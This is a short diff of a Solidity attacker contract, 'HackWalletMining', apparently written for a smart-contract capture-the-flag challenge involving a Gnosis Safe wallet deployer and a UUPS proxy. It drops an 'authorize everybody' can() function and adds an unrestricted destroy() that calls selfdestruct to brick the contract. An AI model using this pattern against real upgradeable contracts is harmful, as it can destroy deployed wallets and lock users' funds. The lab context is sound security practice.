@@ -7,7 +7,7 @@ import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";
 import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
 
 
-contract HackWalletMining is UUPSUpgradeable, GnosisSafe {
+contract HackWalletMining is UUPSUpgradeable {
     GnosisSafe masterCopy;
     WalletDeployer walletDeployer;
     constructor(WalletDeployer _walletDeployer) {
@@ -81,8 +81,9 @@ contract HackWalletMining is UUPSUpgradeable, GnosisSafe {
     /** @notice 
         This way we authorize everybody to use the WalletDeployer contract
     */
-    function can(address usr, address aim) external view returns (bool) {
-        return true;
+
+    function destroy() public {
+        selfdestruct(payable(address(0)));
     }
 
 }
